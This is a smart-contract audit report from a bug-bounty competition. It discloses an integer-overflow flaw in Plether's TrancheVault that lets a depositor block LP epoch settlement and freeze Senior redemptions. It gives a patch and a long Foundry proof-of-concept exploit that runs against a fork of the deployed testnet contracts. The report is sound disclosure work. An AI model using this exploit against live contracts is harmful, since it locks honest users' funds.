# \#100092 [SC-High] Share quote overflow in `TrancheVault.quoteDepositFromState()` lets any depositor freeze LP epoch settlement for more than 24 hours

**Submitted on Nov 16th 2026 at 08:13:18 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100092
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

When Junior principal is only a few thousand atoms, each Junior deposit still activates and multiplies the Junior share supply, so any depositor can grow the supply until the next Junior deposit quote overflows inside `HousePool.settleLpEpoch()`. Every settlement then reverts with Panic(0x11), and a matured Senior redemption can be neither funded nor cancelled until the Senior coupon drains Junior principal to exactly zero. In the PoC an honest Senior LP's redemption stays frozen for 90,001 seconds, which is "Temporary freezing of funds for at least 24 hours".

## Vulnerability Details

`TrancheVault.quoteDepositFromState()` prices a deposit as `Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator)` (TrancheVault.sol#L1409). OpenZeppelin `mulDiv` reverts with Panic(0x11) when the result does not fit in 256 bits.

`HousePool._settleLpEpoch()` skips the Junior deposit phase only when Junior principal is exactly zero (HousePool.sol#L917). At a principal of about 10,000 atoms a matured Junior deposit is still priced, and it multiplies the Junior supply by about deposit / principal. The Senior coupon takes Junior principal every second, capped at the Junior principal (HousePoolWaterfallAccountingLib.sol#L76), so the principal falls back to dust between epochs and the attacker can repeat the cycle.

Once the supply is large, a big enough Junior deposit makes the quote at HousePool.sol#L1046 revert. The `shares == 0` reject branch (HousePool.sol#L1050) is never reached. Senior and Junior redemption funding runs in the same call, so it reverts too. The matured redemption cannot be cancelled (`TrancheVault__RedeemCancellationUnavailable`), and the matured trigger deposit cannot be cancelled (`TrancheVault__DepositEpochAlreadyActive`). Settlement resumes only when the coupon drains Junior principal to exactly zero.

What the PoC assumes: Junior principal is already near zero (the PoC reaches this with 3.21 years of no trading and no LP flow, so the coupon drains Junior), there are no open positions, and the attacker is the first to settle at each chosen second. The only mock is the ArbSys precompile `arbBlockNumber` (address 100).

1. Sam deposits 3,886,290.197815 USDG into Senior, and the deposit activates.
2. Time passes until the coupon has drained Junior principal to 9,989 atoms.
3. Each epoch the attacker requests a Junior deposit and calls `settleLpEpoch()` when Junior principal is about 10,000 atoms. 16 cycles raise the Junior supply from 1,000,009,000,056,000 to about 6.45e74.
4. Sam requests a Senior redemption, and the attacker requests a 400,324.428534 USDG Junior deposit in the same epoch.
5. Every hourly `settleLpEpoch()` reverts with Panic(0x11), and both cancels revert.
6. When Junior principal reaches zero, settlement resumes, Sam's redemption is funded and the trigger deposit is refunded in full.

## Impact Details

**Selected impact:** Temporary freezing of funds for at least 24 hours

Sam's matured redemption of 97,155,603,301,770 Senior shares has 0 claimable USDG through 24 hourly settlement attempts. The first successful settlement comes 90,001 seconds after maturity, and Sam then receives 122,203.017868 USDG. The attacker spends 1,829.774730 USDG, which the coupon moves from Junior to Senior. The 400,324.428534 USDG trigger deposit is refunded in full. An owner `pause()` makes settlement skip the deposit phase, which ends the freeze (with the pause, Sam could claim 122,175.124259 USDG).

## Recommendation

When the quote does not fit in uint256, or the minted shares would push the supply past uint256, price it at 0 shares. The existing reject branch then refunds that deposit epoch, and redemptions still settle. With this fix, the PoC's first settlement succeeds 1 second after maturity.

```diff
diff --git a/packages/perps/src/TrancheVault.sol b/packages/perps/src/TrancheVault.sol
index 17c923b1..44981184 100644
--- a/packages/perps/src/TrancheVault.sol
+++ b/packages/perps/src/TrancheVault.sol
@@ -1406,7 +1406,15 @@ contract TrancheVault is ERC4626, IAsyncTrancheVaultClaimableRedeem {
         }
         uint256 netAssets = feeBps == 0 ? assets : Math.mulDiv(assets, BPS - feeBps, BPS, Math.Rounding.Floor);
         uint256 denominator = pricingAssets + assets + 1 - netAssets;
-        shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
+        uint256 supplyBase = pricingSupply + VIRTUAL_SHARES;
+        // A quote that cannot be minted on top of the supply prices at 0 shares, so settlement refunds the epoch.
+        if (netAssets > denominator && supplyBase > Math.mulDiv(type(uint256).max, denominator, netAssets)) {
+            return 0;
+        }
+        shares = Math.mulDiv(netAssets, supplyBase, denominator, Math.Rounding.Floor);
+        if (shares > type(uint256).max - supplyBase) {
+            return 0;
+        }
     }
 
     // ---------------------------------------------------------------------
```

## Proof of Concept

## Proof of Concept

- Env var: `ARB_SEPOLIA_RPC_URL` = an archive RPC URL of Arbitrum Sepolia; read-only, the test runs on a local fork
- Fork block: 323672710 (chain id 421614)
- Forge: 1.8.7
- Command, from `packages/perps`: `ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/poc/F069_JuniorSupplyOverflowFreeze.t.sol --match-test test_F069_poc -vvv`
- File: `packages/perps/test/poc/F069_JuniorSupplyOverflowFreeze.t.sol` (test file: `test/poc/F069_JuniorSupplyOverflowFreeze.t.sol` inside `packages/perps`)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// TrancheVault M-1 (0xsimao run, 16 Nov): Junior share supply inflated at dust NAV until
// `TrancheVault.quoteDepositFromState()` (TrancheVault.sol:1409) overflows, so every `HousePool.settleLpEpoch()` reverts.
//
// Mechanism under test:
//   - Junior activation mints D * (S + 1000) / (P + 1) shares (TrancheVault.sol:1409, via HousePool.sol:1046).
//   - HousePool defers Junior activation only when P == 0 exactly (HousePool.sol:917); the vault's matured-deposit
//     cancel exit is also exact-zero (TrancheVault.sol:853, :1646).
//   - The Senior coupon drains Junior principal every second, capped at Junior (HousePoolWaterfallAccountingLib.sol:76).
//   - With no open positions, NAV is mark-independent and settlement is permissionless (HousePool.sol:809), so the
//     Junior principal at any second is deterministic.
//   => An attacker deposits into Junior every hour and settles at the second where P is 0.01 USDG, multiplying S by
//      about D / P each time. Once S is large, any Junior deposit D_F with D_F * S / (P + 1) >= 2^256 makes the
//      deposit quote panic (OZ Math.sol:218) inside settlement, reverting the whole call, Senior redemptions included.
//
// PRECONDITION STAND-IN (read before judging): Junior must already be close to zero. This PoC gets there with a
// ~3.2-year quiet period (no trading, no LP flow) in which the Senior coupon drains Junior. That stands in for
// "Junior nearly wiped by any loss path" (adverse FX move, coupon over time, or both). It is NOT a claim that a
// 3-year quiet period is realistic. The attack itself starts at Step 3.
// TIMING ASSUMPTION: the attacker is the first settler at each chosen second (no competing keeper in between).
//
// Chain: Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG).
// Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run (repo root): forge test --root packages/perps --match-path test/poc/F069_JuniorSupplyOverflowFreeze.t.sol -vv
// The fork needs ARB_SEPOLIA_RPC_URL = an ARCHIVE RPC of Arbitrum Sepolia (state at FORK_BLOCK).
// LOCAL FORK ONLY: read-only RPC. Never vm.broadcast, cast send or --broadcast.

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IHousePoolM1 {
    function settleLpEpoch(uint256 expectedMarkPrice, uint256 expectedPublishTime) external; // returns a struct; ignored
    function seniorPrincipal() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function seniorRateBps() external view returns (uint256);
    function lastSeniorCouponCheckpointTime() external view returns (uint256);
    function getPendingDepositTrancheState() external view returns (uint256 seniorAssets, uint256 juniorAssets);
    function getSeniorDepositCapacity() external view returns (uint256);
    function currentLpEpoch() external view returns (uint256);
    function lpEpochStart(uint256 epochId) external view returns (uint256);
    function isOracleFrozen() external view returns (bool);
    function paused() external view returns (bool);
    function pause() external;
    function owner() external view returns (address);
    function seniorVault() external view returns (address);
    function juniorVault() external view returns (address);
    function lpEpochSettlementPaused() external view returns (bool);
    function totalAssets() external view returns (uint256);
    function accountedAssets() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function isTradingActive() external view returns (bool);
    function canAcceptTrancheDeposits(bool isSenior) external view returns (bool);
}

interface IEngineM1 {
    function degradedMode() external view returns (bool);
    function sides(uint256 index)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
}

interface ITrancheVaultM1 {
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function claimDepositShares(uint256 requestId) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function cancelPendingDeposit(uint256 requestId, address receiver, address controller) external returns (uint256);
    function cancelRedeemRequest(uint256 requestId, address receiver, address controller) external returns (uint256);
    function claimRedeem(uint256 requestId, uint256 shares, address receiver, address controller)
        external
        returns (uint256 assets);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function pendingDepositRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimableDepositShares(uint256 requestId, address controller) external view returns (uint256);
    function pendingRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimableRedeemAssets(uint256 requestId, address controller) external view returns (uint256);
    function depositQueueHead() external view returns (uint256);
    function redeemQueueHead() external view returns (uint256);
    function maintenanceFeeAprBps() external view returns (uint256);
    function quoteDepositFromState(uint256 assets, uint256 pricingAssets, uint256 pricingSupply, uint256 feeBps)
        external
        pure
        returns (uint256 shares);
}

interface IArbSysBlockM1 {
    function arbBlockNumber() external view returns (uint256);
}

interface IM1Errors {
    error TrancheVault__DepositEpochAlreadyActive();
    error TrancheVault__RedeemCancellationUnavailable();
}

contract F069_JuniorSupplyOverflowFreeze is Test {
    // Pinned Arbitrum Sepolia block (2026-10-28 12:00 UTC, Wednesday). Senior = 1 USDG seed, Junior = 1,000,000.999992
    // USDG with 1.000009000056e15 shares, no open positions, no queued LP requests. After deployment block 323658447.
    uint256 internal constant FORK_BLOCK = 323672710;

    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;

    uint256 internal constant YEAR = 31_536_000; // HousePoolWaterfallAccountingLib.SECONDS_PER_YEAR
    uint256 internal constant P_TARGET = 10_000; // Junior principal (atoms = 0.01 USDG) at each attacker settle
    uint256 internal constant FREEZE_SECONDS = 25 hours; // designed length of the settlement freeze
    uint256 internal constant MAX_TRIGGER = 10_000_000e6; // cap on the freeze-trigger Junior deposit (USDG)
    uint256 internal constant MAX_CYCLES = 40;

    IHousePoolM1 internal pool = IHousePoolM1(POOL);
    IEngineM1 internal engine = IEngineM1(ENGINE);
    ITrancheVaultM1 internal senior = ITrancheVaultM1(SENIOR_VAULT);
    ITrancheVaultM1 internal junior = ITrancheVaultM1(JUNIOR_VAULT);

    address internal sam = makeAddr("sam"); // honest Senior LP (victim: matured redemption frozen)
    address internal attacker = makeAddr("attacker"); // unprivileged Junior depositor and settler
    address internal bob = makeAddr("bob"); // honest Junior LP (control test only)
    address internal keeper = makeAddr("keeper"); // any settler during the freeze

    uint256 internal cur; // scenario clock (== block.timestamp)
    uint256 internal l2Height = FORK_BLOCK;

    struct Quiet {
        uint256 tSeniorSettle; // when Sam's Senior deposit activated
        uint256 tCross; // first second with projected Junior principal <= P_TARGET
        uint256 samShares; // Senior shares Sam holds
    }

    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");
        // Drift guards: the deployed state this PoC relies on. Every in-scope contract runs as deployed.
        assertEq(pool.seniorVault(), SENIOR_VAULT, "senior vault drifted");
        assertEq(pool.juniorVault(), JUNIOR_VAULT, "junior vault drifted");
        assertEq(pool.owner(), OWNER, "pool owner drifted");
        assertTrue(pool.isTradingActive(), "trading active");
        assertFalse(pool.isOracleFrozen(), "live market at the fork");
        assertFalse(engine.degradedMode(), "engine not degraded");
        assertFalse(pool.paused(), "pool not paused");
        assertFalse(pool.lpEpochSettlementPaused(), "no settlement hold");
        assertEq(pool.seniorPrincipal(), 1_000_008, "Senior = seed only");
        assertEq(pool.juniorPrincipal(), 1_000_000_999_992, "Junior = 1,000,000.999992 USDG");
        assertEq(pool.accountedAssets(), pool.seniorPrincipal() + pool.juniorPrincipal(), "no surplus or deficit");
        assertEq(pool.unassignedAssets(), 0, "no unassigned assets");
        assertEq(pool.seniorRateBps(), 800, "Senior coupon 8%");
        assertEq(junior.maintenanceFeeAprBps(), 0, "Junior fee 0 bps (release config)");
        assertEq(junior.totalSupply(), 1_000_009_000_056_000, "Junior supply at fork");
        assertEq(junior.depositQueueHead(), 0, "no queued Junior deposits");
        assertEq(senior.depositQueueHead(), 0, "no queued Senior deposits");
        assertEq(senior.redeemQueueHead(), 0, "no queued Senior redemptions");
        (, uint256 oiLong,,) = engine.sides(0);
        (, uint256 oiShort,,) = engine.sides(1);
        assertEq(oiLong + oiShort, 0, "no open positions: NAV is mark-independent, settlement permissionless");
        cur = block.timestamp;
    }

    // ================================================================= M-1 proof of concept
    function test_F069_poc() public {
        Quiet memory q = _samAndQuietPeriod();

        // Step 3: inflation cycles. Each cycle the attacker deposits D into Junior for the next epoch and settles at
        //         the second where projected Junior principal is P (~0.01 USDG). Activation mints ~S * D / P shares.
        //         D is sized so the Senior coupon drains Junior back to ~P exactly one cycle later.
        uint256 spent;
        uint256 tsNow = q.tCross;
        uint256 b1 = (q.tCross / 1 hours) * 1 hours;
        uint256 tsNext = _nextSettle(q.tCross);
        _setCur(b1 - 30 minutes); // request before b1's cutoff; Junior principal is still positive
        uint256 j1;
        {
            (uint256 sp1, uint256 jp1) = _projAt(q.tCross);
            j1 = jp1;
            uint256 d1 = _coupon(sp1, tsNext - q.tCross) + P_TARGET - jp1;
            assertTrue(pool.canAcceptTrancheDeposits(false), "Junior entry gate open at dust NAV");
            uint256 id1 = _deposit(junior, attacker, d1);
            spent += d1;
            assertEq(pool.lpEpochStart(id1), b1, "cycle-1 deposit matures at b1");
            _setCur(q.tCross);
            (, uint256 jAt) = pool.getPendingDepositTrancheState();
            assertEq(jAt, j1, "projection stable");
            assertGt(jAt, 0, "Junior principal positive: activation not deferred");
            uint256 sBefore = junior.totalSupply();
            vm.prank(attacker);
            pool.settleLpEpoch(0, 0);
            assertGt(junior.claimableDepositShares(id1, attacker), 0, "cycle 1 activated");
            console.log("[cycle 1] D (USDG atoms)", d1);
            console.log("[cycle 1] Junior principal at activation (atoms)", jAt);
            console.log("[cycle 1] supply multiplier", junior.totalSupply() / sBefore);
        }

        // Steps 3b..: repeat hourly until supply sits in the window where one larger deposit (sets the freeze length)
        //             still activates and a later trigger deposit <= MAX_TRIGGER overflows.
        uint256 cycles = 1;
        uint256 dLast;
        uint256 triggerMin;
        while (true) {
            tsNow = tsNext;
            tsNext = tsNow + 1 hours;
            (uint256 spNext, uint256 jNext) = _projAt(tsNow);
            assertGt(jNext, 0, "Junior principal positive at the next settle");
            uint256 s = junior.totalSupply();
            uint256 dNormal = _coupon(spNext, 1 hours) + P_TARGET - jNext;
            uint256 dFinal = _coupon(spNext, 1 hours + FREEZE_SECONDS) - jNext;
            bool finalActivates = !_quoteOverflows(dFinal, jNext, s);
            if (finalActivates) {
                uint256 sAfter = s + junior.quoteDepositFromState(dFinal, jNext, s, 0);
                uint256 pFreeze = jNext + dFinal - _coupon(spNext, 1 hours);
                triggerMin = _minTrigger(pFreeze, sAfter);
                if (triggerMin <= MAX_TRIGGER) {
                    dLast = dFinal;
                }
            }
            uint256 d = dLast != 0 ? dLast : dNormal;
            assertFalse(_quoteOverflows(d, jNext, s), "planned activation must not overflow (window missed)");
            _deposit(junior, attacker, d); // request right after the previous settle: matures at tsNow - 1
            spent += d;
            _setCur(tsNow);
            assertFalse(pool.isOracleFrozen(), "live market during the cycles");
            vm.prank(attacker);
            pool.settleLpEpoch(0, 0);
            ++cycles;
            if (dLast != 0) {
                break;
            }
            assertLt(cycles, MAX_CYCLES, "too many cycles");
        }
        uint256 supplyFinal = junior.totalSupply();
        console.log("[inflated] cycles", cycles);
        console.log("[inflated] attacker USDG moved into Junior (drained to Senior by the coupon)", spent);
        console.log("[inflated] Junior supply", supplyFinal);
        console.log("[inflated] Junior principal (atoms)", pool.juniorPrincipal());
        console.log("[inflated] smallest Junior deposit that overflows the next quote (atoms)", triggerMin);

        // Step 4: the freeze epoch. Sam (honest Senior LP) requests a redemption; the attacker queues a Junior deposit
        //         of 2 x triggerMin. Both mature at the same boundary.
        uint256 samRedeemShares = q.samShares / 40;
        vm.prank(sam);
        uint256 samRedeemId = senior.requestRedeem(samRedeemShares, sam, sam);
        uint256 dTrigger = triggerMin * 2 < 1e6 ? 1e6 : triggerMin * 2;
        uint256 triggerId = _deposit(junior, attacker, dTrigger);
        assertEq(samRedeemId, triggerId, "same epoch");
        uint256 bF = pool.lpEpochStart(triggerId);
        _setCur(bF + 1);
        assertGe(pool.currentLpEpoch(), triggerId, "freeze epoch matured");
        (, uint256 jFreeze) = pool.getPendingDepositTrancheState();
        assertGt(jFreeze, 0, "Junior principal positive: Junior activation is not deferred");
        console.log("[freeze] trigger deposit (atoms)", dTrigger);
        console.log("[freeze] Junior principal at maturity (atoms)", jFreeze);
        console.log("[freeze] Sam redemption shares", samRedeemShares);

        // Containment branch (fact for severity): an owner pause makes settlement skip the deposit phase
        // (HousePool.sol:903-906), so the redemption funds. Reverted afterwards.
        {
            uint256 snap = vm.snapshotState();
            vm.prank(OWNER);
            pool.pause();
            vm.prank(keeper);
            pool.settleLpEpoch(0, 0);
            assertGt(senior.claimableRedeemAssets(samRedeemId, sam), 0, "owner pause lets the redemption fund");
            console.log("[containment] with owner pause, Sam claimable USDG", senior.claimableRedeemAssets(samRedeemId, sam));
            vm.revertToState(snap);
            _setTime(cur);
        }

        // Step 5: every settlement reverts with Panic(0x11) from the deposit quote; Sam cannot cancel (matured) and
        //         the trigger deposit cannot be cancelled either. Keepers retry every hour.
        uint256 freezeStart = bF;
        uint256 frozenHours;
        bool released;
        for (uint256 h = 0; h <= 60; ++h) {
            _setCur(bF + 1 + h * 1 hours);
            assertFalse(pool.isOracleFrozen(), "live market during the freeze (not the weekend case)");
            vm.prank(keeper);
            (bool ok, bytes memory ret) = POOL.call(abi.encodeCall(IHousePoolM1.settleLpEpoch, (0, 0)));
            if (ok) {
                released = true;
                break;
            }
            assertEq(keccak256(ret), keccak256(abi.encodeWithSignature("Panic(uint256)", 0x11)), "overflow panic");
            assertEq(senior.claimableRedeemAssets(samRedeemId, sam), 0, "Sam's redemption still unfunded");
            if (h == 0) {
                vm.expectRevert(IM1Errors.TrancheVault__RedeemCancellationUnavailable.selector);
                vm.prank(sam);
                senior.cancelRedeemRequest(samRedeemId, sam, sam);
                vm.expectRevert(IM1Errors.TrancheVault__DepositEpochAlreadyActive.selector);
                vm.prank(attacker);
                junior.cancelPendingDeposit(triggerId, attacker, attacker);
            }
            frozenHours = h;
        }
        uint256 releaseTime = cur;
        console.log("[freeze] hours every settlement reverted", frozenHours);
        console.log("[freeze] seconds from maturity to first successful settle", releaseTime - freezeStart);
        assertGe(releaseTime - freezeStart, 24 hours, "F069: Senior redemption frozen >= 24 h by the overflow"); // DAMAGE

        // Step 6 (end of freeze): the coupon took Junior principal to 0, so activation is deferred, the redemption
        //         funds, and the trigger deposit becomes cancellable (projected wipe): the trigger cost nothing.
        assertTrue(released, "settlement resumes once Junior principal reaches 0");
        (, uint256 jEnd) = pool.getPendingDepositTrancheState();
        assertEq(jEnd, 0, "Junior principal drained to 0");
        uint256 samClaimable = senior.claimableRedeemRequest(samRedeemId, sam);
        assertGt(samClaimable, 0, "Sam's redemption funded after the freeze");
        uint256 samBefore = IERC20(USDG).balanceOf(sam);
        vm.prank(sam);
        senior.claimRedeem(samRedeemId, samClaimable, sam, sam);
        uint256 attackerBefore = IERC20(USDG).balanceOf(attacker);
        vm.prank(attacker);
        uint256 refunded = junior.cancelPendingDeposit(triggerId, attacker, attacker);
        assertEq(refunded, dTrigger, "trigger deposit refunded in full");
        assertEq(IERC20(USDG).balanceOf(attacker) - attackerBefore, dTrigger, "attacker recovers the trigger");
        console.log("[after] Sam USDG received", IERC20(USDG).balanceOf(sam) - samBefore);
        console.log("[after] attacker trigger refunded", refunded);
        console.log("[after] attacker net cost (USDG atoms, paid to Senior via coupon)", spent);
    }

    /// Control: same near-wiped Junior, NO inflation cycles. A Junior deposit of MAX_TRIGGER activates normally and the
    /// next settlement with a Senior redemption succeeds. The near-wipe alone does not cause the revert.
    function test_F069_control() public {
        Quiet memory q = _samAndQuietPeriod();
        uint256 b1 = (q.tCross / 1 hours) * 1 hours;
        _setCur(b1 - 30 minutes);
        uint256 bobId = _deposit(junior, bob, MAX_TRIGGER);
        vm.prank(sam);
        uint256 samRedeemId = senior.requestRedeem(q.samShares / 40, sam, sam);
        assertEq(bobId, samRedeemId, "same epoch");
        _setCur(q.tCross);
        (, uint256 jAt) = pool.getPendingDepositTrancheState();
        assertGt(jAt, 0, "Junior principal positive");
        vm.prank(keeper);
        pool.settleLpEpoch(0, 0);
        assertGt(junior.claimableDepositShares(bobId, bob), 0, "Bob's Junior deposit activates");
        assertGt(senior.claimableRedeemAssets(samRedeemId, sam), 0, "Sam's redemption funds");
        console.log("[control] Junior principal at activation (atoms)", jAt);
        console.log("[control] Junior supply after", junior.totalSupply());
    }

    // ------------------------------------------------------------------ scenario setup

    /// Steps 1-2: Sam joins Senior (sized so the coupon drains Junior to P_TARGET on a Monday ~13:00 UTC), then a
    /// quiet period with no trading or LP flow (PRECONDITION STAND-IN, see header).
    function _samAndQuietPeriod() internal returns (Quiet memory q) {
        uint256 bS = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        q.tSeniorSettle = bS + 30;
        uint256 tTarget = _mondayAt13(q.tSeniorSettle + (YEAR * 32) / 10);
        (, uint256 j0) = pool.getPendingDepositTrancheState();
        uint256 seniorNeeded = (j0 - P_TARGET) * 10_000 * YEAR / (pool.seniorRateBps() * (tTarget - q.tSeniorSettle));
        uint256 samDeposit = seniorNeeded - pool.seniorPrincipal();
        assertLe(samDeposit, pool.getSeniorDepositCapacity(), "Sam's Senior deposit fits the governed capacity");

        // Step 1: Sam's Senior deposit activates at the next epoch.
        uint256 samId = _deposit(senior, sam, samDeposit);
        _setCur(q.tSeniorSettle);
        vm.prank(keeper);
        pool.settleLpEpoch(0, 0);
        vm.prank(sam);
        q.samShares = senior.claimDepositShares(samId);
        assertGt(q.samShares, 0, "Sam holds Senior shares");
        console.log("[setup] Sam Senior deposit (USDG atoms)", samDeposit);
        console.log("[setup] Senior principal", pool.seniorPrincipal());
        console.log("[setup] Junior principal", pool.juniorPrincipal());

        // Step 2: quiet period. Find the first second where projected Junior principal <= P_TARGET.
        uint256 lo = q.tSeniorSettle;
        uint256 hi = q.tSeniorSettle + 4 * YEAR;
        while (lo < hi) {
            uint256 mid = (lo + hi) / 2;
            (, uint256 jp) = _projAt(mid);
            if (jp <= P_TARGET) {
                hi = mid;
            } else {
                lo = mid + 1;
            }
        }
        q.tCross = lo;
        (, uint256 jCross) = _projAt(q.tCross);
        assertGt(jCross, 0, "crossing lands on a positive Junior principal");
        console.log("[quiet] years elapsed (x100)", (q.tCross - q.tSeniorSettle) * 100 / YEAR);
        console.log("[quiet] crossing timestamp", q.tCross);
        console.log("[quiet] Junior principal at crossing (atoms)", jCross);
    }

    // ------------------------------------------------------------------ helpers

    function _deposit(ITrancheVaultM1 vault, address lp, uint256 assets) internal returns (uint256 requestId) {
        deal(USDG, lp, IERC20(USDG).balanceOf(lp) + assets);
        vm.startPrank(lp);
        IERC20(USDG).approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, lp);
        vm.stopPrank();
    }

    /// Senior coupon for `elapsed` seconds on `seniorP` (HousePoolWaterfallAccountingLib.calculateSeniorCoupon).
    function _coupon(uint256 seniorP, uint256 elapsed) internal view returns (uint256) {
        return seniorP * pool.seniorRateBps() * elapsed / (10_000 * YEAR);
    }

    /// Next attacker settle: one second after the first epoch boundary at least 50 minutes after `t`.
    function _nextSettle(uint256 t) internal pure returns (uint256) {
        uint256 b = (t / 1 hours + 1) * 1 hours;
        if (b - t < 50 minutes) {
            b += 1 hours;
        }
        return b + 1;
    }

    /// True if the deployed vault's own quote cannot price these inputs (reverts on overflow, or prices 0 shares).
    function _quoteOverflows(uint256 assets, uint256 pricingAssets, uint256 supply) internal view returns (bool) {
        try junior.quoteDepositFromState(assets, pricingAssets, supply, 0) returns (uint256 shares) {
            return shares == 0;
        } catch {
            return true;
        }
    }

    /// Smallest deposit whose quote overflows at (pricingAssets, supply), found by binary search on the real quote.
    function _minTrigger(uint256 pricingAssets, uint256 supply) internal view returns (uint256) {
        uint256 lo = 1;
        uint256 hi = type(uint128).max;
        if (!_quoteOverflows(hi, pricingAssets, supply)) {
            return type(uint256).max;
        }
        while (lo < hi) {
            uint256 mid = lo + (hi - lo) / 2;
            if (_quoteOverflows(mid, pricingAssets, supply)) {
                hi = mid;
            } else {
                lo = mid + 1;
            }
        }
        return lo;
    }

    /// Projected (Senior, Junior) principal at time `t`, read from the deployed HousePool view, state untouched.
    function _projAt(uint256 t) internal returns (uint256 sP, uint256 jP) {
        uint256 snap = vm.snapshotState();
        _setTime(t);
        (sP, jP) = pool.getPendingDepositTrancheState();
        vm.revertToState(snap);
        _setTime(cur);
    }

    /// First Monday 13:00 UTC at or after `t` (Unix day 0 was a Thursday).
    function _mondayAt13(uint256 t) internal pure returns (uint256) {
        uint256 day = t / 1 days;
        uint256 weekdayMon0 = (day + 3) % 7;
        uint256 monday = day + (7 - weekdayMon0) % 7;
        uint256 candidate = monday * 1 days + 13 hours;
        return candidate >= t ? candidate : candidate + 7 days;
    }

    function _setCur(uint256 t) internal {
        require(t >= cur, "clock must move forward");
        l2Height += 4 * (t - cur) + 1;
        cur = t;
        _setTime(t);
    }

    /// Sets block time and the L2 block (ArbSys precompile mocked to the rolled height, as in the F-056 PoC).
    function _setTime(uint256 t) internal {
        vm.warp(t);
        vm.roll(l2Height);
        vm.mockCall(address(100), abi.encodeWithSelector(IArbSysBlockM1.arbBlockNumber.selector), abi.encode(l2Height));
    }
}
```
